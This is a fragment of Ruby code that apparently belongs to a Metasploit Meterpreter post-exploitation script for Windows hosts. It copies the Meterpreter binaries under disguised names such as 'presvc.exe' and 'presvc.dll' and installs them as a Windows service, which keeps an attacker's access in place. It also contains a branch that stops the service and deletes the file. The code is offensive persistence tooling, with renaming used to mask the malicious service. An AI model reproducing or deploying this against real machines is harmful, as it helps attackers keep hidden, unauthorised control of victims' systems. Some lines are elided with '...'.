...
if client.platform == 'windows'
  ...
  bins = {
    'metsrv.x86.dll'    => 'presvc.dll',
    'metsvc-server.exe' => 'presvc-server.exe',
    'metsvc.exe'        => 'presvc.exe'
  }
  ...
  if(not remove)
    ...
    data = m_exec(client, "presvc.exe install-service")
    print_line("\t#{data}")
  else
    print_status("Stopping the service...")
    client.fs.dir.chdir(tempdir)
    data = m_exec(client, "presvc.exe remove-service")
    print_line("\t#{data}")
  end

  if(remove)
    m_exec(client, "cmd.exe /c del presvc.exe")
  end
